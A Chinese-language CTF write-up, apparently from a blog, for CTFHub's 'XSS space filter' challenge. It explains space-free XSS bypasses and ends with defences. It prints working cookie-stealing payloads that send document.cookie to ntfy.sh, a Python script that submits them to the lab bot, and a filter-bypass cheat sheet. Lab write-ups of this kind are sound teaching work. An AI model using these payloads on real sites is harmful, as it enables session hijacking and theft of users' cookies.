---
layout: post
title: CTFHub - XSS 空格过滤 Writeup
platform: ctfhub
date: 2026-10-23 15:59:00 +0800
categories: CTF
---

CTFHub - XSS 空格过滤 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → XSS 空格过滤）
- 题型：Web
- 考点：**空格过滤绕过**、无空格 payload

```text
页面标题：CTFHub 技能学习 | XSS 空格过滤
表单：GET ?name=xxx  → 页面显示 "Hello, xxx"
另有 Send URL to Bot

★ 确认过滤的是【空格】：

    ?name=hello world
    → Hello, helloworld          ← ★ 空格被删掉了！（连在一起）

★ 确认没过滤别的：

    ?name=<script>alert(1)</script>
    → Hello, <script>alert(1)</script>        ✅ script 标签可用

    ?name=<img/src=x/onerror=alert(1)>
    → Hello, <img/src=x/onerror=alert(1)>     ✅ / 代替空格也可用

★ 关键发现：<script> 里的 JS 代码【本来就不需要空格】

    <script>fetch('url',{method:'POST',mode:'no-cors',body:document.cookie})</script>
    → 一个空格都没有！空格过滤完全拦不住

★ 直接用无空格 payload 打通：

    <script>fetch('https://ntfy.sh/<topic>',{method:'POST',mode:'no-cors',
            body:'cookie='+encodeURIComponent(document.cookie)})</script>

    （整行实际无空格，这里换行只是为了排版）

★ 外带结果：

    cookie=flag=ctfhub{47092f107586f9884b2351f7}
    ua=...HeadlessChrome/112...

flag         : ctfhub{47092f107586f9884b2351f7}
```

二、题目分析

**① 空格过滤为什么是"最弱的防护"**

```text
空格在 XSS payload 里的作用 = "分隔符"

    <img src=x onerror=alert(1)>
         ↑     ↑
      两个空格，把"标签名 / 属性名 / 属性值"分开

但 HTML 和 JS 里，"分隔符"不止空格一种：

    HTML：/   Tab   ！换行  回车
    JS：  注释 /**/   、换行、运算符本身

★ 所以"过滤空格"等于"只堵了一个门，窗户全开着"
```

**② 三种绕过思路**

**思路 A：换分隔符（HTML 属性场景）**

```html
<!-- 原始（有空格） -->
<img src=x onerror=alert(1)>

<!-- 用 / 代替空格 -->
<img/src=x/onerror=alert(1)>

<!-- 用 Tab（%09） -->
<img%09src=x%09onerror=alert(1)>

<!-- 用换行（%0a） -->
<img%0Asrc=x%0Aonerror=alert(1)>
```

**为什么 `/` 能代替空格**：

```
HTML5 的解析规则里，标签内部的 / 被视为"分隔符"
（它本来用于自闭合标签，如 <br/>，但在解析时也起分隔作用）

所以 <img/src=x> 会被解析成"img 标签，属性 src=x"
```

**思路 B：用根本不需要空格的 payload**

```html
<!-- script 里的代码不需要 HTML 空格 -->
<script>alert(1)</script>

<!-- 带上外带功能，依然没有空格 -->
<script>fetch('https://ntfy.sh/xxx',{method:'POST',mode:'no-cors',body:document.cookie})</script>

<!-- javascript: 协议也不需要 -->
<a href="javascript:alert(1)">x</a>
```

**★ 本题 `<script>` 没被过滤，所以这是最省事的路线。**

**思路 C：JS 代码里用注释代替空格**

```javascript
// 需要空格的地方（比如 var 和变量名之间）
var a = 1
// 用注释代替
var/**/a=1

// 多数地方 JS 语法本身就不要求空格
fetch('url',{method:'POST'})   // 没有空格，完全合法
```

**★ 注意**：`/**/` 在 **HTML 里不是分隔符**，只在 JS/SQL 里能用。

**③ 为什么 `<script>` 里的代码不需要空格**

```javascript
// 这样写（有空格，可读性好）
fetch('url', { method: 'POST', mode: 'no-cors', body: document.cookie })

// 这样写（完全等价，零空格）
fetch('url',{method:'POST',mode:'no-cors',body:document.cookie})
```

**原因**：

```
JS 的语法里，标点符号本身就是分隔符：
    ,  :  {  }  (  )  ;  =  +  '  "
    
只要有这些标点，词法分析器就知道"这里该断开"
空格纯粹是可读性需要，不是语法需要

★ 例外：关键字之间必须有分隔
    var a      ← var 和 a 之间要有空格或注释
    return x   ← return 和 x 之间要有空格或注释
    new Date   ← 同理
```

三、解题步骤

**第 1 步：确认过滤了什么**

```
测试 ①：?name=hello world
    → Hello, helloworld
    ★ 空格被删了

测试 ②：?name=<script>alert(1)</script>
    → 原样输出
    ★ script 没被过滤

测试 ③：?name=<img/src=x/onerror=alert(1)>
    → 原样输出
    ★ 说明 / 也没被过滤
```

**结论**：只过滤空格，其他都放过。

**第 2 步：选最简单的 payload**

**因为 `<script>` 可用，直接用无空格的 script**：

```html
<script>alert(1)</script>
```

**在浏览器里验证**：

```
http://challenge-xxx:10800/?name=<script>alert(1)</script>
→ 弹窗出现 ✅
```

**第 3 步：换成外带 Cookie 的 payload**

```html
<script>fetch('https://ntfy.sh/你的topic',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})</script>
```

**检查**：

```
✅ 空格数 = 0
✅ 没有 % （避免被当成 URL 编码处理）
```

**第 4 步：URL 编码后提交给 Bot**

```python
import urllib.parse
payload = "<script>fetch('https://ntfy.sh/xxx',{method:'POST',mode:'no-cors',body:document.cookie})</script>"
url = base + "/?name=" + urllib.parse.quote(payload, safe="")
```

**提交**：

```bash
curl -X POST "http://challenge-xxx:10800/submit" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://challenge-xxx:10800/?name=%3Cscript%3Efetch..."}'
```

**第 5 步：读接收端**

```bash
curl "https://ntfy.sh/你的topic/json?poll=1"
```

**收到**：

```json
{"event":"message",
 "message":"cookie=flag%3Dctfhub%7B47092f107586f9884b2351f7%7D|ua=..."}
```

**解码**：

```
flag%3Dctfhub%7B47092f107586f9884b2351f7%7D
  ↓
flag=ctfhub{47092f107586f9884b2351f7}
```

**第 6 步：提交 → 通关**

---

**完整脚本（实测用的）**

```python
import ssl, json, urllib.request, urllib.parse, time, random, string

base  = "http://challenge-xxx:10800"
TOPIC = "ctfhub_space_" + "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
NTFY  = "https://ntfy.sh/" + TOPIC

# ★ 无空格 payload
payload = ("<script>fetch('%s',{method:'POST',mode:'no-cors',"
           "body:'cookie='+encodeURIComponent(document.cookie)})</script>") % NTFY
assert " " not in payload, "payload 里不能有空格！"

url = base + "/?name=" + urllib.parse.quote(payload, safe="")

body = json.dumps({"url": url}).encode()
req = urllib.request.Request(base + "/submit", data=body, method="POST",
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())      # {"code":0,"msg":"Successfully"}

for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

---

**如果 `<script>` 也被过滤了怎么办（备用方案）**

**用 `/` 代替空格**：

```html
<img/src=x/onerror=fetch('https://ntfy.sh/xxx',{method:'POST',mode:'no-cors',body:document.cookie})>
```

**或者用 Tab**：

```
<img%09src=x%09onerror=...>
```

**或者用 `svg`**：

```html
<svg/onload=fetch('https://ntfy.sh/xxx',{method:'POST',body:document.cookie})>
```

**或者 `details`**：

```html
<details/open/ontoggle=fetch('...',{...})>
```

---

**手工操作（浏览器就能做完）**

```
① 打开 https://ntfy.sh/你的topic  （接收端）

② 在地址栏直接访问：
   http://challenge-xxx:10800/?name=<script>fetch('https://ntfy.sh/你的topic',{method:'POST',mode:'no-cors',body:document.cookie})</script>

   ★ 这时会弹出/执行你自己的（空的）cookie，证明 payload 有效

③ 把同一个 URL 填进 "Send URL to Bot" → Send

   ⚠️ 注意：地址栏里直接打会有特殊字符问题，
      建议用脚本或控制台 encodeURIComponent 生成编码后的 URL
```

四、延伸知识

**① HTML 里的"空白"和"分隔"**

```html
<!-- 以下几种写法，HTML 解析结果完全一样 -->
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>      （Tab）
<img%0Asrc=x%0Aonerror=alert(1)>      （换行）
<img%0Dsrc=x%0Donerror=alert(1)>      （回车）

★ 因为 HTML 的词法分析把"空白字符"和"/"都当作分隔
```

**② JS 里的"空白"和"分隔"**

```javascript
// 这些都没有空格，语法完全合法
if(1)alert(1)
for(;;)break
fetch('url',{method:'POST'})
a=1,b=2
var/**/c=3              // 用注释代替空格

// 但有些地方必须有分隔
var a = 1               // var 和 a 之间
return x                // return 和 x 之间
new Date                // new 和 Date 之间
typeof x                // typeof 和 x 之间
```

**③ XSS 各种"过滤"的绕过对照表**

| 被过滤的 | 绕过方法 |
|---|---|
| **空格** | `/`、`%09`(Tab)、`%0A`(换行)、`/**/`（JS里）、用不需要空格的 payload |
| **`<script>`** | `<img src=x onerror=...>`、`<svg onload=...>`、`<details open ontoggle=...>`、`<body onload=...>` |
| **`alert`** | `confirm()`、`prompt()`、`console.log()`、`eval(atob('...'))` |
| **`onerror`** | `onload`、`onfocus`、`onmouseover`、`ontoggle`、`onstart` |
| **引号** | 用反引号 `` ` ``、用 `String.fromCharCode()`、`eval(atob(...))` |
| **括号 `()`** | `` alert`1` ``（模板字符串）、`throw/onerror=alert`、`location=javascript:...` |
| **大小写匹配** | `<ScRiPt>`、`<IMG SRC=x OnErRoR=...>` |
| **`javascript:`** | `<img src=x onerror=...>`、`<svg onload=...>` |
| **点号 `.`** | `document['cookie']`、用 `with` |

**④ 为什么"黑名单过滤"注定失败**

```text
攻击者需要找到【一个】能突破的写法
防守方需要堵住【所有】写法

攻击者的选择空间：
    · 标签：script / img / svg / details / body / iframe / marquee / input...
    · 事件：onerror / onload / onfocus / ontoggle / onmouseover / onstart...
    · 分隔：空格 / Tab / 换行 / 回车 / 斜杠 / 注释
    · 编码：URL / HTML 实体 / Base64 / Unicode
    · 大小写：任意组合

★ 组合爆炸 —— 黑名单永远堵不完
```

**⑤ 防护**

```text
· ★ 输出编码（根本方法）
    HTML 实体编码：< > & " '  →  &lt; &gt; &amp; &quot; &#39;

· ★ CSP（内容安全策略）—— 第二道防线
    Content-Security-Policy: script-src 'self'
    → 内联脚本不执行、外链脚本不加载
    → 就算注入成功也跑不起来

· ★ Cookie 加 HttpOnly
    → document.cookie 读不到

· 富文本用白名单净化（DOMPurify）
    → 只允许安全的标签和属性

· 黑名单过滤 = 最弱的防护（本课的反面教材）
```

五、总结

- **本题核心：只过滤了空格，而 XSS 的 payload 可以完全不写空格。**
- 一句话：

```text
空格 → 换成 / 或 %09 或 %0A，或者干脆用不需要空格的 <script>
```

- 可直接用的 payload（零空格）：

```html
<script>fetch('https://ntfy.sh/<topic>',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

- **三个必记要点**：

```text
① HTML 里 / 可以当空格用：<img/src=x/onerror=...>
② <script> 里的 JS 代码天然不需要空格（标点就是分隔符）
③ 空格过滤是"最弱防护"——它只堵了众多分隔符中的一个
```

- **实测 flag**：

```text
ctfhub{47092f107586f9884b2351f7}
```

**手工复现要点**：

```text
· 先在浏览器地址栏试：?name=<script>alert(1)</script>  能弹窗就通了
· 换成 fetch 到 ntfy（无空格）
· URL 编码后提交给 Bot
· 读 ntfy 拿 flag
```
